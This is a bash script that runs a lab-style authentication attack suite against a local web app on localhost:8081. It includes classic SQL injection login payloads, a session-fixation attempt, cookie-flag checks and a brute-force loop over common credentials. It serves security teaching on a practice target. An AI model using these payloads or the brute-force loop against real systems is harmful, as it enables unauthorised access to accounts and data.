#!/bin/bash

# Broken Authentication Testing Suite Runner
# Educational Purpose: Menjalankan semua testing scenarios

echo "🔓 BROKEN AUTHENTICATION TESTING SUITE"
echo "======================================"
echo "⚠️  WARNING: Educational purpose only!"
echo "📅 Date: $(date)"
echo "🎯 Target: http://localhost:8081"
echo ""

# Check if Python is available
if ! command -v python3 &> /dev/null; then
    echo "❌ Python3 is required but not installed."
    exit 1
fi

# Check if requests library is available
python3 -c "import requests" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "📦 Installing required Python packages..."
    pip3 install requests
fi

# Check if application is running
echo "🔍 Checking if application is running..."
curl -s http://localhost:8081 > /dev/null
if [ $? -ne 0 ]; then
    echo "❌ Application is not running. Please start with: docker-compose up -d"
    exit 1
fi
echo "✅ Application is running"
echo ""

# Function to run with pause
run_with_pause() {
    echo "📋 $1"
    echo "$(printf '=%.0s' {1..50})"
    echo ""
    
    if [ "$2" = "auto" ]; then
        $3
    else
        read -p "Press Enter to continue or 's' to skip: " choice
        if [ "$choice" != "s" ]; then
            $3
        else
            echo "⏭️  Skipped"
        fi
    fi
    echo ""
    echo "$(printf '⏸️ %.0s' {1..20})"
    echo ""
}

# Test 1: Quick Vulnerability Scan
quick_scan() {
    echo "🔍 QUICK VULNERABILITY SCAN"
    echo "--------------------------"
    
    # Test for obvious vulnerabilities
    echo "🍪 Cookie Security Test:"
    cookie_header=$(curl -s -I http://localhost:8081 | grep -i "set-cookie")
    echo "$cookie_header"
    
    # Check for security flags
    if echo "$cookie_header" | grep -qi "httponly"; then
        echo "   ✅ HttpOnly flag present"
    else
        echo "   🚨 Missing HttpOnly flag - vulnerable to XSS"
    fi
    
    if echo "$cookie_header" | grep -qi "secure"; then
        echo "   ✅ Secure flag present" 
    else
        echo "   🚨 Missing Secure flag - vulnerable over HTTP"
    fi
    
    echo ""
    echo "🔐 Session Fixation Test:"
    # Test session fixation vulnerability
    fixed_session="ATTACKER_SESSION_123456789"
    session_response=$(curl -s "http://localhost:8081?sessionid=$fixed_session")
    
    if echo "$session_response" | grep -qi "session_id.*cannot be changed\|session.*already active"; then
        echo "⚠️  Session fixation vulnerability detected (but implementation is flawed)"
        echo "   The code attempts session fixation but fails due to improper implementation"
        echo "   This reveals a security flaw in the session handling logic"
    elif echo "$session_response" | grep -qi "session.*fixed\|session.*set"; then
        echo "🚨 CRITICAL: Session fixation attack successful!"
    else
        session_exposed=$(echo "$session_response" | grep -i "session\|phpsessid" | head -1)
        if [ -n "$session_exposed" ]; then
            echo "🚨 Session information exposed in response"
        else
            echo "✅ No session fixation vulnerability detected"
        fi
    fi
    
    echo ""
    echo "🚨 SQL Injection Test:"
    # Test basic SQL injection payloads
    sql_payloads=("admin'" "admin\" OR \"1\"=\"1\"--" "admin' UNION SELECT 1,2,3--")
    sqli_found=false
    
    for payload in "${sql_payloads[@]}"; do
        sql_response=$(curl -s -X POST http://localhost:8081/index.php -d "username=$payload&password=test")
        
        # Check for different types of SQL errors or unusual responses
        if echo "$sql_response" | grep -qi "fatal error\|pdoexception\|mysql\|syntax error\|sql"; then
            echo "🚨 SQL Injection vulnerability detected with payload: $payload"
            echo "$sql_response" | grep -i "fatal error\|pdoexception\|mysql\|syntax error" | head -1 | sed 's/<[^>]*>//g'
            sqli_found=true
            break
        fi
    done
    
    if [ "$sqli_found" = false ]; then
        echo "✅ No SQL injection errors detected - using prepared statements"
        echo "   (This is actually good security practice!)"
    fi
    
    echo ""
    echo "🔓 Weak Credentials Test:"
    response=$(curl -s -X POST http://localhost:8081/index.php -d "username=admin&password=admin")
    if echo "$response" | grep -qi "login successful\|welcome"; then
        echo "✅ Default credentials work: admin/admin"
    else
        echo "❌ Default credentials don't work"
    fi
}

# Test 2: Brute Force Demo
brute_force_demo() {
    echo "🔓 BRUTE FORCE ATTACK DEMONSTRATION"
    echo "--------------------------------"
    
    # Quick brute force test with common credentials
    credentials=(
        "admin:admin"
        "admin:password"
        "john:password"
        "jane:123456"
        "bob:qwerty"
    )
    
    echo "🎯 Testing ${#credentials[@]} common credential combinations..."
    echo ""
    
    for cred in "${credentials[@]}"; do
        IFS=':' read -r username password <<< "$cred"
        echo "🔍 Testing: $username:$password"
        
        response=$(curl -s -X POST http://localhost:8081/index.php -d "username=$username&password=$password")
        
        if echo "$response" | grep -qi "login successful\|welcome"; then
            echo "   ✅ SUCCESS! $username:$password works"
        else
            echo "   ❌ Failed"
        fi
        
        sleep 0.5
    done
}

# Test 3: Session Security Demo
session_demo() {
    echo "🍪 SESSION SECURITY DEMONSTRATION"
    echo "------------------------------"
    
    # Get session cookie
    echo "🔍 Getting session cookie..."
    curl -c session_cookies.txt -s http://localhost:8081 > /dev/null
    
    if [ -f session_cookies.txt ]; then
        session_id=$(grep PHPSESSID session_cookies.txt | cut -f7)
        echo "📋 Session ID: $session_id"
        
        echo ""
        echo "🔍 Cookie Security Analysis:"
        cookie_header=$(curl -s -I http://localhost:8081 | grep -i "set-cookie")
        
        if echo "$cookie_header" | grep -qi "httponly"; then
            echo "   ✅ HttpOnly flag present"
        else
            echo "   ❌ HttpOnly flag missing - vulnerable to XSS"
        fi
        
        if echo "$cookie_header" | grep -qi "secure"; then
            echo "   ✅ Secure flag present"
        else
            echo "   ❌ Secure flag missing - works over HTTP"
        fi
        
        if echo "$cookie_header" | grep -qi "samesite"; then
            echo "   ✅ SameSite flag present"
        else
            echo "   ❌ SameSite flag missing - vulnerable to CSRF"
        fi
        
        rm -f session_cookies.txt
    fi
}

# Test 4: SQL Injection Demo
sql_injection_demo() {
    echo "💉 SQL INJECTION DEMONSTRATION"
    echo "----------------------------"
    
    payloads=(
        "admin'--"
        "' OR '1'='1'--"
        "admin'; SELECT version()--"
    )
    
    echo "🎯 Testing ${#payloads[@]} SQL injection payloads..."
    echo ""
    
    for payload in "${payloads[@]}"; do
        echo "🔍 Testing payload: $payload"
        
        response=$(curl -s -X POST http://localhost:8081/index.php -d "username=$payload&password=test")
        
        if echo "$response" | grep -qi "error\|exception\|mysql\|sql"; then
            echo "   🚨 SQL ERROR DETECTED! Potential vulnerability"
        elif echo "$response" | grep -qi "login successful\|welcome"; then
            echo "   ✅ Authentication bypassed!"
        else
            echo "   ❌ No obvious vulnerability"
        fi
        
        sleep 0.5
    done
}

# Main menu
show_menu() {
    echo "🔧 TESTING OPTIONS:"
    echo "=================="
    echo "1. Quick Vulnerability Scan"
    echo "2. Brute Force Attack Demo"
    echo "3. Session Security Demo"
    echo "4. SQL Injection Demo"
    echo "5. Run Comprehensive Python Suite"
    echo "6. Run All Tests (Automated)"
    echo "7. View Documentation"
    echo "0. Exit"
    echo ""
}

# Run comprehensive Python testing suite
run_python_suite() {
    echo "🐍 RUNNING COMPREHENSIVE PYTHON TESTING SUITE"
    echo "============================================"
    
    if [ -f "attack_testing_suite.py" ]; then
        python3 attack_testing_suite.py
    else
        echo "❌ attack_testing_suite.py not found"
    fi
}

# View documentation
view_docs() {
    echo "📚 AVAILABLE DOCUMENTATION:"
    echo "========================="
    
    docs=(
        "ATTACK_SCENARIOS.md - Comprehensive attack scenarios guide"
        "Discussion.md - Session management and cookies discussion"
        "RANGKUMAN_PERCAKAPAN.md - Conversation summary"
    )
    
    for doc in "${docs[@]}"; do
        filename=$(echo "$doc" | cut -d' ' -f1)
        description=$(echo "$doc" | cut -d' ' -f3-)
        
        if [ -f "$filename" ]; then
            echo "✅ $doc"
        else
            echo "❌ $doc (not found)"
        fi
    done
    
    echo ""
    echo "💡 To view a document:"
    echo "   cat ATTACK_SCENARIOS.md | head -50"
    echo "   less ATTACK_SCENARIOS.md"
}

# Run all tests automatically
run_all_tests() {
    echo "🚀 RUNNING ALL TESTS AUTOMATICALLY"
    echo "================================"
    
    run_with_pause "Quick Vulnerability Scan" "auto" quick_scan
    run_with_pause "Brute Force Attack Demo" "auto" brute_force_demo
    run_with_pause "Session Security Demo" "auto" session_demo
    run_with_pause "SQL Injection Demo" "auto" sql_injection_demo
    
    echo "✅ All basic tests completed!"
    echo ""
    echo "🐍 For comprehensive testing, run:"
    echo "   python3 attack_testing_suite.py"
}

# Main script logic
if [ "$1" = "--auto" ]; then
    run_all_tests
    exit 0
fi

# Interactive mode
while true; do
    show_menu
    read -p "Select option (0-7): " choice
    echo ""
    
    case $choice in
        1) run_with_pause "Quick Vulnerability Scan" "manual" quick_scan ;;
        2) run_with_pause "Brute Force Attack Demo" "manual" brute_force_demo ;;
        3) run_with_pause "Session Security Demo" "manual" session_demo ;;
        4) run_with_pause "SQL Injection Demo" "manual" sql_injection_demo ;;
        5) run_python_suite ;;
        6) run_all_tests ;;
        7) view_docs ;;
        0) echo "👋 Goodbye!"; break ;;
        *) echo "❌ Invalid option. Please try again." ;;
    esac
done

echo ""
echo "🔒 SECURITY REMINDER:"
echo "==================="
echo "• These tests are for educational purposes only"
echo "• Only test on systems you own or have permission to test"
echo "• Always follow responsible disclosure practices"
echo "• Use this knowledge to build more secure applications"
echo ""
echo "📚 Learn more about secure coding practices:"
echo "• OWASP Top 10: https://owasp.org/www-project-top-ten/"
echo "• OWASP Cheat Sheets: https://cheatsheetseries.owasp.org/"